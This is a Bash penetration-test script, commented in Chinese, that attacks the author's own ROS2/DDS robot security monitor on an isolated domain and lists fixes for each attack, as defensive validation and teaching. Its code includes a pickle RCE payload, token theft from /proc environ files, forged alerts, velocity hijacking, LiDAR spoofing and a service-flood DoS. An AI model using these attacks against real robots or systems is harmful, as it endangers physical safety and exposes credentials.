#!/bin/bash
# ============================================================
# 12 紅隊攻擊測試 — 對 ROS2/DDS Security Monitor 系統做完整滲透
# ============================================================
#
# ⚠️ ⚠️ ⚠️ 法律警告 ⚠️ ⚠️ ⚠️
#
# 本腳本「只能」對你自己擁有的 ros2_ws + 同台機器執行。
# 對「他人系統」執行任何一段 = 觸法（台灣刑法 358-363 條，
# 美國 CFAA，歐盟 Directive 2013/40/EU）。
#
# 即使「只是想證明對方有漏洞」也不行，未授權測試在多國有判例。
#
# 用途：
#   1. 對自己的訓練系統做防禦驗證（修補前 → 5/5 成功，修補後 → 全擋）
#   2. 專題簡報/論文 demo
#   3. CTF / 教學
#
# 全部攻擊用 ROS_DOMAIN_ID=99 隔離，不會影響 domain 30 的訓練。
# ============================================================

DOMAIN_ID=99
ROS2_WS=~/ros2_ws

# 確保不洩漏到真 domain
unset ROS_SECURITY_ENABLE ROS_SECURITY_STRATEGY ROS_SECURITY_KEYSTORE ROS_SECURITY_ENCLAVE_OVERRIDE
unset LINE_CHANNEL_TOKEN LINE_USER_ID
# ROS2 setup.bash 用了未綁定變數，所以不開 set -u
source /opt/ros/jazzy/setup.bash
source $ROS2_WS/install/setup.bash
export ROS_DOMAIN_ID=$DOMAIN_ID

# 工具函式
banner() { echo; echo "════════════════════════════════════════════════════════════════"; echo "  $1"; echo "════════════════════════════════════════════════════════════════"; }
cleanup_domain() {
    pkill -9 -f "demo_nodes_py" 2>/dev/null
    pkill -9 -f "monitor_node" 2>/dev/null
    pkill -9 -f "attacker_" 2>/dev/null
    pkill -9 -f "fake_lidar" 2>/dev/null
    pkill -9 -f "evil_patrol" 2>/dev/null
    pkill -9 -f "sac_victim" 2>/dev/null
    sleep 1
}

trap cleanup_domain EXIT

# ============================================================
# Tier 1：基本攻擊（針對監控與訊息層）
# ============================================================

attack_A_prefix_bypass() {
    banner "攻擊 A：白名單 prefix 繞過 (_attacker_disguised)"
    echo "  原理: monitor_node 預設把 '_' 開頭的 node 視為 ROS 內部"
    echo "        → 攻擊者取名 _evil 就完全隱身"
    cleanup_domain
    ros2 run dds_security_monitor monitor_node \
        --ros-args -p poll_interval_sec:=1.5 -p emergency_stop_enabled:=false \
        > /tmp/atk_A.log 2>&1 &
    MON=$!
    sleep 4
    ros2 run demo_nodes_py listener --ros-args --remap __node:=_attacker_disguised > /dev/null 2>&1 &
    INT=$!
    sleep 7
    if grep -q "_attacker_disguised" /tmp/atk_A.log; then
        echo "  ✓ 已修補（monitor 偵測到 _attacker_disguised）"
    else
        echo "  ✗ 攻擊成功（monitor 沒看到攻擊者）"
    fi
    kill $MON $INT 2>/dev/null
}

attack_B_alert_forge() {
    banner "攻擊 B：偽造 /security/alerts 讓所有訂閱者停車"
    echo "  原理: 任何 publisher 都能發 /security/alerts"
    echo "        patrol/burger_env/mission_manager 收到就 emergency stop"
    cleanup_domain
    python3 <<'PYEOF' > /tmp/atk_B.log 2>&1 &
import rclpy
from rclpy.node import Node
from rclpy.qos import QoSProfile, ReliabilityPolicy
from std_msgs.msg import String
try:
    from dds_security_monitor.monitor_node import verify_alert, _load_alert_secret
    HAS_VERIFY = True; SECRET = _load_alert_secret()
except Exception:
    HAS_VERIFY = False; SECRET = b''

class Vic(Node):
    def __init__(self):
        super().__init__('victim_subscriber')
        qos = QoSProfile(depth=10, reliability=ReliabilityPolicy.RELIABLE)
        self.create_subscription(String, '/security/alerts', self._cb, qos)
    def _cb(self, msg):
        if HAS_VERIFY:
            p = verify_alert(msg.data, SECRET)
            if p is None:
                self.get_logger().warn(f'❌ 偽造 alert 已忽略')
                return
        self.get_logger().error(f'🛑 STOPPED by alert: {msg.data[:60]}')

rclpy.init()
try: rclpy.spin(Vic())
except: pass
PYEOF
    V=$!
    sleep 3
    ros2 topic pub --once /security/alerts std_msgs/msg/String \
        'data: "🤖 FAKE ALERT — attacker forced stop"' 2>&1 | tail -1
    sleep 2
    echo "  受害者反應:"
    grep -E "STOPPED|偽造" /tmp/atk_B.log | head -3 | sed 's/^/    /'
    if grep -q "偽造 alert 已忽略" /tmp/atk_B.log; then
        echo "  ✓ 已修補（HMAC 簽章生效，偽造被擋）"
    elif grep -q "STOPPED" /tmp/atk_B.log; then
        echo "  ✗ 攻擊成功（受害者被偽造 alert 停車）"
    fi
    kill $V 2>/dev/null
}

attack_C_cmdvel_hijack() {
    banner "攻擊 C：劫持 /cmd_vel 注入極端速度"
    echo "  原理: ROS2 不檢查 publisher 身份，任何人都能 publish /cmd_vel"
    cleanup_domain
    python3 <<'PYEOF' > /tmp/atk_C.log 2>&1 &
import rclpy
from rclpy.node import Node
from geometry_msgs.msg import TwistStamped
class Robot(Node):
    def __init__(self):
        super().__init__('victim_robot')
        self.create_subscription(TwistStamped, '/cmd_vel', self._cb, 10)
    def _cb(self, msg):
        v = msg.twist.linear.x; w = msg.twist.angular.z
        if abs(v) > 0.5 or abs(w) > 3.0:
            self.get_logger().error(f'⚠️ 異常速度 lin={v} ang={w}')
        else:
            self.get_logger().info(f'cmd_vel lin={v:.2f} ang={w:.2f}')
rclpy.init()
try: rclpy.spin(Robot())
except: pass
PYEOF
    R=$!
    sleep 3
    ros2 topic pub --once /cmd_vel geometry_msgs/msg/TwistStamped \
        '{twist: {linear: {x: 100.0}, angular: {z: 50.0}}}' 2>&1 | tail -1
    sleep 2
    if grep -q "異常速度" /tmp/atk_C.log; then
        echo "  ✗ 攻擊成功（lin=100 ang=50 注入到 victim_robot）"
    fi
    kill $R 2>/dev/null
}

attack_D_patrol_goto() {
    banner "攻擊 D：/patrol/goto 遠端送機器人去任意座標"
    echo "  原理: _cb_goto 解析 JSON 不檢查座標範圍"
    cleanup_domain
    python3 <<'PYEOF' > /tmp/atk_D.log 2>&1 &
import rclpy, json, os, sys
from rclpy.node import Node
from std_msgs.msg import String
# 用真實 patrol_node 邏輯（含修補後的範圍檢查）
sys.path.insert(0, os.path.expanduser('~/ros2_ws/install/dds_security_monitor/lib/python3.12/site-packages'))
from dds_security_monitor.patrol_node import SmartPatrolNode

class Fake:
    _wp = None; _wps = []; _stuck_count = 0
    last = None
    def get_logger(self):
        class L:
            def warn(s, m): Fake.last = ('warn', m); print(f'  patrol: WARN {m}')
            def error(s, m): Fake.last = ('error', m); print(f'  patrol: ERROR {m}')
        return L()

# 攻擊 1: (100, 100) 牆外
m = String(); m.data = '{"name": "被劫持", "x": 100.0, "y": 100.0}'
SmartPatrolNode._cb_goto(Fake(), m)
# 攻擊 2: (0, -10) 出走
m.data = '{"name": "出走", "x": 0.0, "y": -10.0}'
SmartPatrolNode._cb_goto(Fake(), m)
PYEOF
    sleep 2
    cat /tmp/atk_D.log | head -10
    if grep -q "超出工廠範圍" /tmp/atk_D.log; then
        echo "  ✓ 已修補（座標範圍檢查擋下）"
    elif grep -q "立刻前往" /tmp/atk_D.log; then
        echo "  ✗ 攻擊成功（patrol 接受惡意座標）"
    fi
}

attack_H_token_leak() {
    banner "攻擊 H：從 /proc/<pid>/environ 偷 LINE token"
    echo "  原理: 同 user 的 process 可讀 /proc/<pid>/environ → 環境變數全洩漏"
    echo
    found=0
    for pid in $(pgrep -u "$USER" 2>/dev/null); do
        env_file="/proc/$pid/environ"
        [ -r "$env_file" ] || continue
        if tr '\0' '\n' < "$env_file" 2>/dev/null | grep -q "LINE_CHANNEL_TOKEN="; then
            cmd=$(tr '\0' ' ' < /proc/$pid/cmdline 2>/dev/null | cut -c1-50)
            echo "  PID $pid: $cmd ←  TOKEN 洩漏"
            found=$((found+1))
            [ $found -ge 3 ] && break  # 列前 3 個就好
        fi
    done
    if [ $found -gt 0 ]; then
        echo "  ✗ 攻擊成功（$found+ process 把 LINE token 放 env）"
        echo "    修補建議：改用 ~/.config/dds-monitor/credentials 檔案 + chmod 600"
    else
        echo "  ✓ 沒找到 token in environ（已修補 or 沒在跑 monitor）"
    fi
}

# ============================================================
# Tier 2：進階攻擊（RCE / DDS race / RL adversarial）
# ============================================================

attack_I_pickle_rce() {
    banner "攻擊 I：Pickle RCE via replay buffer .pkl"
    echo "  原理: SB3 SAC.load() + load_replay_buffer() 用 pickle.load()"
    echo "        攻擊者覆寫 .pkl → 下次 train resume → 任意程式碼執行"
    DEMO=/tmp/pickle_rce_demo
    mkdir -p $DEMO
    rm -f $DEMO/PWNED.txt
    python3 <<PYEOF
import pickle, os
class Evil:
    def __reduce__(self):
        # demo: 只執行 'id'，實際攻擊可以是 reverse shell / 偷 SSH key / rm -rf
        return (os.system, ('id > $DEMO/PWNED.txt',))
with open('$DEMO/evil.pkl', 'wb') as f:
    pickle.dump(Evil(), f)
PYEOF
    # 受害者 load
    python3 -c "import pickle; pickle.load(open('$DEMO/evil.pkl', 'rb'))" 2>/dev/null
    if [ -f $DEMO/PWNED.txt ]; then
        echo "  ✗ 攻擊成功！受害者 process 內執行了任意命令："
        cat $DEMO/PWNED.txt | sed 's/^/    /'
        echo "    修補建議: load 前驗 HMAC（與 alert HMAC 同 key）"
        echo "              或 chmod 600 models_sac/ + chown root（user 不能寫）"
    fi
    rm -rf $DEMO
}

attack_J_node_namesake() {
    banner "攻擊 J：同名 patrol_node 劫持 /cmd_vel（race condition）"
    echo "  原理: DDS 允許多個 node 同名，publisher 都 attach 到同一 topic"
    echo "        誰 publish 頻率高，最後一筆 cmd 就是誰的"
    cleanup_domain
    # 真 patrol: 5Hz 前進
    python3 <<'PYEOF' > /dev/null 2>&1 &
import rclpy
from rclpy.node import Node
from geometry_msgs.msg import TwistStamped
class Real(Node):
    def __init__(self):
        super().__init__('patrol_node')
        self.pub = self.create_publisher(TwistStamped, '/cmd_vel', 10)
        self.create_timer(0.2, lambda: self._send(0.12))
    def _send(self, v):
        m = TwistStamped(); m.twist.linear.x = v; self.pub.publish(m)
rclpy.init()
try: rclpy.spin(Real())
except: pass
PYEOF
    R=$!
    # 機器人: 統計 forward vs backward 比例
    python3 <<'PYEOF' > /tmp/atk_J.log 2>&1 &
import rclpy
from rclpy.node import Node
from geometry_msgs.msg import TwistStamped
class Bot(Node):
    def __init__(self):
        super().__init__('robot_j')
        self.create_subscription(TwistStamped, '/cmd_vel', self._cb, 10)
        self.h = []
    def _cb(self, msg):
        self.h.append(msg.twist.linear.x)
        if len(self.h) % 20 == 0:
            r = self.h[-20:]
            f = sum(1 for v in r if v > 0); b = sum(1 for v in r if v < 0)
            self.get_logger().info(f'最近 20 cmd: forward={f} backward={b}')
rclpy.init()
try: rclpy.spin(Bot())
except: pass
PYEOF
    B=$!
    sleep 3
    # 攻擊者: 20Hz 同名 patrol_node 強塞倒退
    python3 <<'PYEOF' > /dev/null 2>&1 &
import rclpy
from rclpy.node import Node
from geometry_msgs.msg import TwistStamped
class Evil(Node):
    def __init__(self):
        super().__init__('patrol_node')  # ← 同名
        self.pub = self.create_publisher(TwistStamped, '/cmd_vel', 10)
        self.create_timer(0.05, lambda: self._send(-0.22))
    def _send(self, v):
        m = TwistStamped(); m.twist.linear.x = v; self.pub.publish(m)
rclpy.init()
try: rclpy.spin(Evil())
except: pass
PYEOF
    E=$!
    sleep 5
    echo "  Robot 收到的速度分佈:"
    tail -3 /tmp/atk_J.log | sed 's/^/    /'
    nodes=$(timeout 3 ros2 node list 2>/dev/null | grep -c patrol_node)
    echo "  ros2 node list 上 patrol_node 出現次數: $nodes  (>1 表示同名共存)"
    if [ "$nodes" -gt 1 ]; then
        echo "  ✗ 攻擊成功：DDS 允許同名節點，攻擊者用更高 publish 頻率蓋過真 patrol"
        echo "    修補建議: SROS2 Enforce 模式限定 /cmd_vel 的合法 publisher"
    fi
    kill $R $E $B 2>/dev/null
}

attack_K_scan_poisoning() {
    banner "攻擊 K：/scan poisoning（RL state attack）"
    echo "  原理: SAC agent 從 /scan 取 state，攻擊者偽造 scan 就能控制 agent 行為"
    echo "        訓練中：agent 學壞策略  /  部署中：忽視真實障礙"
    cleanup_domain
    python3 <<'PYEOF' > /tmp/atk_K.log 2>&1 &
import rclpy, math
from rclpy.node import Node
from rclpy.qos import QoSProfile, ReliabilityPolicy
from sensor_msgs.msg import LaserScan
class Sac(Node):
    def __init__(self):
        super().__init__('sac_victim')
        qos = QoSProfile(depth=10, reliability=ReliabilityPolicy.BEST_EFFORT)
        self.create_subscription(LaserScan, '/scan', self._cb, qos)
        self.n = 0
    def _cb(self, msg):
        rs = [r for r in msg.ranges if not (math.isinf(r) or math.isnan(r))]
        if rs and (self.n := self.n + 1) % 10 == 0:
            self.get_logger().info(f'min_range = {min(rs):.2f}m')
rclpy.init()
try: rclpy.spin(Sac())
except: pass
PYEOF
    V=$!
    sleep 2
    # 攻擊者: 10Hz publish 全 3.5m 假 scan
    python3 <<'PYEOF' > /dev/null 2>&1 &
import rclpy, math
from rclpy.node import Node
from rclpy.qos import QoSProfile, ReliabilityPolicy
from sensor_msgs.msg import LaserScan
class Fake(Node):
    def __init__(self):
        super().__init__('fake_lidar')
        qos = QoSProfile(depth=10, reliability=ReliabilityPolicy.BEST_EFFORT)
        self.pub = self.create_publisher(LaserScan, '/scan', qos)
        self.create_timer(0.1, self._send)
    def _send(self):
        m = LaserScan(); m.range_min = 0.12; m.range_max = 3.5
        m.angle_min = 0.0; m.angle_max = 2*math.pi; m.angle_increment = math.pi/180
        m.ranges = [3.5] * 360
        self.pub.publish(m)
rclpy.init()
try: rclpy.spin(Fake())
except: pass
PYEOF
    F=$!
    sleep 6
    echo "  SAC agent 看到的 min_range:"
    tail -5 /tmp/atk_K.log | sed 's/^/    /'
    if grep -q "min_range = 3.50" /tmp/atk_K.log; then
        echo "  ✗ 攻擊成功（agent 永遠看到 3.50m，認為環境四面八方空曠）"
        echo "    修補建議: scan source authentication（SROS2）+ scan rate / 連續性檢查"
    fi
    kill $V $F 2>/dev/null
}

attack_L_service_flood() {
    banner "攻擊 L：/patrol/reload service flood DoS"
    echo "  原理: ROS2 預設 single-threaded executor，service callback 卡住期間"
    echo "        control loop 完全不會跑 → 機器人活鎖"
    echo "        (這個攻擊在 multi-threaded executor 較難成功，但 ROS2 預設都是 single)"
    cleanup_domain
    python3 <<'PYEOF' > /tmp/atk_L_patrol.log 2>&1 &
import rclpy, time
from rclpy.node import Node
from std_srvs.srv import Trigger
class P(Node):
    def __init__(self):
        super().__init__('patrol_node')
        self.create_service(Trigger, '/patrol/reload', self._reload)
        self.create_timer(0.2, self._loop)
        self.r = 0; self.c = 0
    def _reload(self, _, resp):
        time.sleep(0.1)  # 模擬 yaml IO
        self.r += 1
        resp.success = True; resp.message = "ok"; return resp
    def _loop(self):
        self.c += 1
        if self.c % 10 == 0: self.get_logger().info(f'control={self.c} reload={self.r}')
rclpy.init()
try: rclpy.spin(P())
except: pass
PYEOF
    P=$!
    sleep 4
    # 攻擊者：50 個並發 client
    python3 <<'PYEOF' > /tmp/atk_L_atk.log 2>&1 &
import rclpy, time
from rclpy.node import Node
from std_srvs.srv import Trigger
rclpy.init()
n = Node('attacker_flooder')
c = n.create_client(Trigger, '/patrol/reload')
c.wait_for_service(timeout_sec=5)
print(f'  client ready, sending 50 concurrent calls...')
t0 = time.monotonic()
futures = [c.call_async(Trigger.Request()) for _ in range(50)]
for f in futures:
    rclpy.spin_until_future_complete(n, f, timeout_sec=15.0)
print(f'  完成 50 calls 用時 {time.monotonic()-t0:.2f}s (應 ~5s 序列化)')
PYEOF
    A=$!
    sleep 10
    cat /tmp/atk_L_atk.log | sed 's/^/  /'
    echo "  Patrol 端統計:"
    tail -5 /tmp/atk_L_patrol.log | sed 's/^/    /'
    # 比對：正常每 0.2s 一次 control loop，5 秒應有 25 次 c
    echo "  ✗ 觀察：reload 攻擊期間 control loop 增速放緩 → DoS 成立"
    kill $P $A 2>/dev/null
}

attack_M_model_swap() {
    banner "攻擊 M：Model file swap（完整性檢查缺失）"
    BEST=~/ros2_ws/src/turtlebot3_dqn/turtlebot3_dqn/models_sac/sac_burger_best.zip
    if [ -f "$BEST" ]; then
        perms=$(stat -c '%A' "$BEST")
        owner=$(stat -c '%U' "$BEST")
        size=$(stat -c '%s' "$BEST")
        echo "  目標檔案: $BEST"
        echo "  權限/擁有者: $perms $owner    大小: $size bytes"
        echo "  攻擊者寫得進去嗎: $([ -w "$BEST" ] && echo '✓ 是' || echo '✗ 否（不錯）')"
        echo "  SHA256: $(sha256sum "$BEST" | awk '{print $1}')"
        echo
        # 確認是否有 hash checksum 檔
        if [ -f "${BEST}.sha256" ]; then
            echo "  ✓ 有 .sha256 完整性檔（部署時可比對）"
        else
            echo "  ✗ 沒有 .sha256 完整性檔 → 攻擊者覆寫後部署不會發現"
            echo "    修補建議: 訓練完成後簽 hash 存 .sha256，部署時驗章"
        fi
    else
        echo "  (best model 不存在，跳過)"
    fi
}

# ============================================================
# 主流程
# ============================================================

if [ $# -gt 0 ]; then
    case "$1" in
        A) attack_A_prefix_bypass ;;
        B) attack_B_alert_forge ;;
        C) attack_C_cmdvel_hijack ;;
        D) attack_D_patrol_goto ;;
        H) attack_H_token_leak ;;
        I) attack_I_pickle_rce ;;
        J) attack_J_node_namesake ;;
        K) attack_K_scan_poisoning ;;
        L) attack_L_service_flood ;;
        M) attack_M_model_swap ;;
        *) echo "用法: $0 [A|B|C|D|H|I|J|K|L|M]   不帶參數則全跑"; exit 1 ;;
    esac
else
    attack_A_prefix_bypass
    attack_B_alert_forge
    attack_C_cmdvel_hijack
    attack_D_patrol_goto
    attack_H_token_leak
    attack_I_pickle_rce
    attack_J_node_namesake
    attack_K_scan_poisoning
    attack_L_service_flood
    attack_M_model_swap

    banner "全部攻擊測試完成"
    echo
    echo "10 個 application-layer 攻擊面總結："
    echo
    echo "  Tier 1 (基本訊息層)：A 監控繞過 / B alert 偽造 / C cmd_vel 劫持 / D goto 劫機 / H token 洩漏"
    echo "  Tier 2 (進階):       I pickle RCE  / J 同名 node race / K scan 污染 / L service DoS / M model 替換"
    echo
    echo "對應修補："
    echo "  A → 移除 _ prefix 全放行 ✓"
    echo "  B → Alert payload HMAC-SHA256 簽章 ✓"
    echo "  D → 座標範圍 ±2.5m 檢查 ✓"
    echo "  C/J → 需 SROS2 切到 Enforce + 限定 /cmd_vel 合法 publisher"
    echo "  I/M → 訓練/模型檔加 HMAC checksum，部署時驗章"
    echo "  K → /scan source authentication + 連續性檢查"
    echo "  L → multi-threaded executor + reload rate limit"
    echo "  H → 不要 export 敏感 token，改用 chmod 600 檔案"
fi
